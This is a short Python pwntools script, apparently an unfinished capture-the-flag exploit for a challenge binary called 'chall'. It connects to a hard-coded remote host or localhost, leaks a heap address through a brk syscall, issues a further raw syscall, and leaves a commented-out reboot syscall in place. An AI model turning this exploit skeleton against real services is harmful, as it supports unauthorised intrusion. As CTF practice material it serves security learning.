#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./chall"

rhp1 = {"host":"13.231.207.73", "port":9006}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)


def hoge(conn,num):
  conn.recvuntil(": ")
  conn.sendline(str(num))

def fuga(conn,call,a1,a2,a3):
  hoge(conn,call)
  hoge(conn,a1)
  hoge(conn,a2)
  hoge(conn,a3)
  conn.recvuntil("retval: ")
  return int(conn.recvline().rstrip(),16)

def fugax(conn,call,a1,a2,a3):
  hoge(conn,call)
  hoge(conn,a1)
  hoge(conn,a2)
  hoge(conn,a3)

heap_size = 0x21000

def exploit(conn):
  raw_input()
  heap_addr = fuga(conn,12,0,0,0) - heap_size
  print("[*]heap: "+hex(heap_addr))

  fugax(conn,437,1,heap_addr+8,0x100)

  #fuga(conn,81,0,9,0)

  #print(hex(fuga(conn,169,0xfee1dead,672274793,0x4321fedc)))

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

